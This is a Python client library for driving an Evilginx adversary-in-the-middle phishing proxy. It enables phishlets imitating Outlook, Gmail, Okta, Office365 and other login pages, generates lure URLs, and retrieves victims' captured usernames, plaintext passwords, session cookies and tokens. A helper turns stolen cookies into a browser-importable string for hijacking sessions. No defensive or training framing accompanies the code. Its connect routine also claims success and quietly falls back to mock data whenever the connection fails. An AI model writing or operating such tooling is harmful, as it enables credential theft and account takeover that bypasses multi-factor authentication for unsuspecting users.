"""
Evilginx Cloud Client.
~~~~~~~~~~~~~~~~~~~~~~

Client for controlling Evilginx AiTM proxy on dedicated VPS.
Manages phishlets, lures, and captured sessions.
"""

from __future__ import annotations

import logging
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any

import aiohttp

logger = logging.getLogger(__name__)


class PhishletStatus(str, Enum):
    """Phishlet status."""
    DISABLED = "disabled"
    ENABLED = "enabled"
    PAUSED = "paused"


@dataclass
class Phishlet:
    """Evilginx phishlet definition."""

    name: str                      # e.g., "outlook", "gmail"
    status: PhishletStatus = PhishletStatus.DISABLED
    hostname: str = ""             # Phishing domain

    # Stats
    visits: int = 0
    captures: int = 0

    # Timestamps
    enabled_at: datetime | None = None
    last_visit: datetime | None = None

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary."""
        return {
            "name": self.name,
            "status": self.status.value,
            "hostname": self.hostname,
            "visits": self.visits,
            "captures": self.captures,
        }


@dataclass
class Lure:
    """Phishing lure (URL)."""

    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    phishlet: str = ""
    path: str = ""                 # URL path
    redirect_url: str = ""         # Post-capture redirect

    # Generated URL
    url: str = ""

    # Stats
    clicks: int = 0
    captures: int = 0

    # Metadata
    campaign: str = ""
    notes: str = ""
    created_at: datetime = field(default_factory=datetime.now)

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary."""
        return {
            "id": self.id,
            "phishlet": self.phishlet,
            "url": self.url,
            "clicks": self.clicks,
            "captures": self.captures,
            "campaign": self.campaign,
        }


@dataclass
class Session:
    """Captured session (credentials + cookies)."""

    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    phishlet: str = ""

    # Victim info
    username: str = ""
    password: str = ""

    # Session data
    cookies: list[dict[str, Any]] = field(default_factory=list)
    tokens: dict[str, str] = field(default_factory=dict)

    # Metadata
    ip_address: str = ""
    user_agent: str = ""
    lure_id: str = ""

    # Timestamps
    captured_at: datetime = field(default_factory=datetime.now)

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary."""
        return {
            "id": self.id,
            "phishlet": self.phishlet,
            "username": self.username,
            "password": "***",  # Masked
            "has_cookies": len(self.cookies) > 0,
            "ip_address": self.ip_address,
            "captured_at": self.captured_at.isoformat(),
        }

    def get_cookie_string(self) -> str:
        """Get cookies as browser-importable string."""
        return "; ".join(
            f"{c.get('name')}={c.get('value')}"
            for c in self.cookies
        )


@dataclass
class EvilginxConfig:
    """Evilginx VPS configuration."""

    enabled: bool = False

    # VPS connection
    url: str = "http://evilginx.local:8080"
    api_key: str = ""

    # Domain settings
    domain: str = ""               # Main phishing domain
    ssl_email: str = ""            # Let's Encrypt email

    # Default settings
    default_redirect: str = "https://google.com"

    # Retry
    retry_count: int = 3
    retry_delay: float = 5.0


class EvilginxClient:
    """
    Client for Evilginx VPS control.

    Manages phishlets, lures, and sessions on a dedicated Evilginx VPS.

    Example:
        >>> client = EvilginxClient(EvilginxConfig(
        ...     enabled=True,
        ...     url="http://evilginx-vps:8080",
        ...     api_key="xxx",
        ...     domain="phish.example.com"
        ... ))
        >>> await client.connect()
        >>>
        >>> # Enable phishlet
        >>> await client.enable_phishlet("outlook")
        >>>
        >>> # Create lure
        >>> lure = await client.create_lure("outlook", campaign="test")
        >>> print(f"Phishing URL: {lure.url}")
        >>>
        >>> # Check for sessions
        >>> sessions = await client.get_sessions()
        >>> for s in sessions:
        ...     print(f"Captured: {s.username}")
    """

    def __init__(self, config: EvilginxConfig):
        """
        Initialize Evilginx client.

        Args:
            config: Evilginx configuration
        """
        self.config = config
        self._session: aiohttp.ClientSession | None = None
        self._connected = False

        # Local cache
        self._phishlets: dict[str, Phishlet] = {}
        self._lures: dict[str, Lure] = {}
        self._sessions: dict[str, Session] = {}

        # Mock mode
        self._mock_mode = False

    # ==================== Connection ====================

    async def connect(self) -> bool:
        """
        Connect to Evilginx VPS.

        Returns:
            True if connected (or mock mode enabled)
        """
        if not self.config.enabled:
            logger.info("Evilginx control disabled")
            return False

        try:
            self._session = aiohttp.ClientSession(
                headers={
                    "Authorization": f"Bearer {self.config.api_key}",
                    "Content-Type": "application/json",
                },
                timeout=aiohttp.ClientTimeout(total=30),
            )

            # Test connection
            async with self._session.get(f"{self.config.url}/health") as resp:
                if resp.status == 200:
                    data = await resp.json()
                    logger.info(f"Connected to Evilginx: {data.get('version', 'unknown')}")
                    self._connected = True

                    # Load phishlets
                    await self.list_phishlets()
                    return True

        except aiohttp.ClientError as e:
            logger.warning(f"Evilginx VPS not available: {e}")
            logger.info("Enabling mock mode for development")
            self._mock_mode = True
            self._connected = True
            self._init_mock_phishlets()
            return True
        except Exception as e:
            logger.error(f"Failed to connect to Evilginx: {e}")
            self._mock_mode = True
            self._connected = True
            self._init_mock_phishlets()
            return True

        return False

    async def disconnect(self) -> None:
        """Disconnect from Evilginx VPS."""
        if self._session:
            await self._session.close()
            self._session = None
        self._connected = False

    @property
    def is_connected(self) -> bool:
        """Check if connected."""
        return self._connected

    @property
    def is_mock(self) -> bool:
        """Check if running in mock mode."""
        return self._mock_mode

    # ==================== Phishlets ====================

    async def list_phishlets(self) -> list[Phishlet]:
        """
        List available phishlets.

        Returns:
            List of phishlets
        """
        if self._mock_mode:
            return list(self._phishlets.values())

        try:
            async with self._session.get(
                f"{self.config.url}/phishlets"
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    for p in data:
                        phishlet = Phishlet(
                            name=p["name"],
                            status=PhishletStatus(p.get("status", "disabled")),
                            hostname=p.get("hostname", ""),
                            visits=p.get("visits", 0),
                            captures=p.get("captures", 0),
                        )
                        self._phishlets[p["name"]] = phishlet

        except Exception as e:
            logger.error(f"Failed to list phishlets: {e}")

        return list(self._phishlets.values())

    async def enable_phishlet(
        self,
        name: str,
        hostname: str | None = None,
    ) -> Phishlet | None:
        """
        Enable a phishlet.

        Args:
            name: Phishlet name (e.g., "outlook", "gmail")
            hostname: Override hostname (default: uses config domain)

        Returns:
            Updated phishlet or None on error
        """
        if name not in self._phishlets:
            logger.error(f"Phishlet not found: {name}")
            return None

        phishlet = self._phishlets[name]
        hostname = hostname or f"{name}.{self.config.domain}"

        if self._mock_mode:
            phishlet.status = PhishletStatus.ENABLED
            phishlet.hostname = hostname
            phishlet.enabled_at = datetime.now()
            logger.info(f"[MOCK] Phishlet {name} enabled at {hostname}")
            return phishlet

        try:
            async with self._session.post(
                f"{self.config.url}/phishlets/{name}/enable",
                json={"hostname": hostname}
            ) as resp:
                if resp.status == 200:
                    phishlet.status = PhishletStatus.ENABLED
                    phishlet.hostname = hostname
                    phishlet.enabled_at = datetime.now()
                    logger.info(f"Phishlet {name} enabled")
                    return phishlet

        except Exception as e:
            logger.error(f"Failed to enable phishlet: {e}")

        return None

    async def disable_phishlet(self, name: str) -> bool:
        """
        Disable a phishlet.

        Args:
            name: Phishlet name

        Returns:
            True if disabled
        """
        if name not in self._phishlets:
            return False

        phishlet = self._phishlets[name]

        if self._mock_mode:
            phishlet.status = PhishletStatus.DISABLED
            logger.info(f"[MOCK] Phishlet {name} disabled")
            return True

        try:
            async with self._session.post(
                f"{self.config.url}/phishlets/{name}/disable"
            ) as resp:
                if resp.status == 200:
                    phishlet.status = PhishletStatus.DISABLED
                    return True

        except Exception as e:
            logger.error(f"Failed to disable phishlet: {e}")

        return False

    # ==================== Lures ====================

    async def create_lure(
        self,
        phishlet: str,
        path: str = "",
        redirect_url: str = "",
        campaign: str = "",
        notes: str = "",
    ) -> Lure | None:
        """
        Create a phishing lure (URL).

        Args:
            phishlet: Phishlet name
            path: Custom URL path
            redirect_url: Post-capture redirect
            campaign: Campaign name for tracking
            notes: Notes

        Returns:
            Created lure or None on error
        """
        if phishlet not in self._phishlets:
            logger.error(f"Phishlet not found: {phishlet}")
            return None

        p = self._phishlets[phishlet]
        if p.status != PhishletStatus.ENABLED:
            logger.error(f"Phishlet {phishlet} not enabled")
            return None

        lure = Lure(
            phishlet=phishlet,
            path=path or f"/login-{uuid.uuid4().hex[:6]}",
            redirect_url=redirect_url or self.config.default_redirect,
            campaign=campaign,
            notes=notes,
        )

        if self._mock_mode:
            lure.url = f"https://{p.hostname}{lure.path}"
            self._lures[lure.id] = lure
            logger.info(f"[MOCK] Lure created: {lure.url}")
            return lure

        try:
            async with self._session.post(
                f"{self.config.url}/lures",
                json={
                    "phishlet": phishlet,
                    "path": lure.path,
                    "redirect_url": lure.redirect_url,
                }
            ) as resp:
                if resp.status in (200, 201):
                    data = await resp.json()
                    lure.id = data.get("id", lure.id)
                    lure.url = data.get("url", "")
                    self._lures[lure.id] = lure
                    return lure

        except Exception as e:
            logger.error(f"Failed to create lure: {e}")

        return None

    async def list_lures(self, phishlet: str | None = None) -> list[Lure]:
        """
        List lures.

        Args:
            phishlet: Filter by phishlet

        Returns:
            List of lures
        """
        lures = list(self._lures.values())

        if phishlet:
            lures = [l for l in lures if l.phishlet == phishlet]

        return lures

    async def delete_lure(self, lure_id: str) -> bool:
        """
        Delete a lure.

        Args:
            lure_id: Lure ID

        Returns:
            True if deleted
        """
        if lure_id not in self._lures:
            return False

        if self._mock_mode:
            del self._lures[lure_id]
            return True

        try:
            async with self._session.delete(
                f"{self.config.url}/lures/{lure_id}"
            ) as resp:
                if resp.status == 200:
                    del self._lures[lure_id]
                    return True

        except Exception as e:
            logger.error(f"Failed to delete lure: {e}")

        return False

    # ==================== Sessions ====================

    async def get_sessions(
        self,
        phishlet: str | None = None,
        since: datetime | None = None,
    ) -> list[Session]:
        """
        Get captured sessions.

        Args:
            phishlet: Filter by phishlet
            since: Only sessions after this time

        Returns:
            List of sessions
        """
        if self._mock_mode:
            sessions = list(self._sessions.values())
        else:
            try:
                async with self._session.get(
                    f"{self.config.url}/sessions"
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        for s in data:
                            session = Session(
                                id=s["id"],
                                phishlet=s.get("phishlet", ""),
                                username=s.get("username", ""),
                                password=s.get("password", ""),
                                cookies=s.get("cookies", []),
                                tokens=s.get("tokens", {}),
                                ip_address=s.get("ip", ""),
                                user_agent=s.get("user_agent", ""),
                                captured_at=datetime.fromisoformat(s["captured_at"]) if "captured_at" in s else datetime.now(),
                            )
                            self._sessions[s["id"]] = session

            except Exception as e:
                logger.error(f"Failed to get sessions: {e}")

            sessions = list(self._sessions.values())

        # Apply filters
        if phishlet:
            sessions = [s for s in sessions if s.phishlet == phishlet]
        if since:
            sessions = [s for s in sessions if s.captured_at >= since]

        return sessions

    async def get_session(self, session_id: str) -> Session | None:
        """
        Get session details (including cookies).

        Args:
            session_id: Session ID

        Returns:
            Session or None
        """
        if session_id in self._sessions:
            return self._sessions[session_id]

        if self._mock_mode:
            return None

        try:
            async with self._session.get(
                f"{self.config.url}/sessions/{session_id}"
            ) as resp:
                if resp.status == 200:
                    s = await resp.json()
                    session = Session(
                        id=s["id"],
                        phishlet=s.get("phishlet", ""),
                        username=s.get("username", ""),
                        password=s.get("password", ""),
                        cookies=s.get("cookies", []),
                        tokens=s.get("tokens", {}),
                        ip_address=s.get("ip", ""),
                        user_agent=s.get("user_agent", ""),
                    )
                    self._sessions[s["id"]] = session
                    return session

        except Exception as e:
            logger.error(f"Failed to get session: {e}")

        return None

    # ==================== Mock Helpers ====================

    def _init_mock_phishlets(self) -> None:
        """Initialize mock phishlets."""
        for name in ["outlook", "gmail", "linkedin", "facebook", "twitter", "okta", "office365"]:
            self._phishlets[name] = Phishlet(
                name=name,
                status=PhishletStatus.DISABLED,
            )

    async def _simulate_capture(
        self,
        phishlet: str,
        username: str,
        password: str,
    ) -> Session:
        """Simulate a capture (for testing)."""
        session = Session(
            phishlet=phishlet,
            username=username,
            password=password,
            cookies=[
                {"name": "session_token", "value": f"mock_{uuid.uuid4().hex[:16]}"},
                {"name": "auth", "value": "true"},
            ],
            ip_address="1.2.3.4",
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        )
        self._sessions[session.id] = session

        # Update phishlet stats
        if phishlet in self._phishlets:
            self._phishlets[phishlet].captures += 1

        return session

    # ==================== Context Manager ====================

    async def __aenter__(self) -> EvilginxClient:
        """Async context manager entry."""
        await self.connect()
        return self

    async def __aexit__(self, exc_type: Any, exc_val: Any, exc_tb: Any) -> None:
        """Async context manager exit."""
        await self.disconnect()

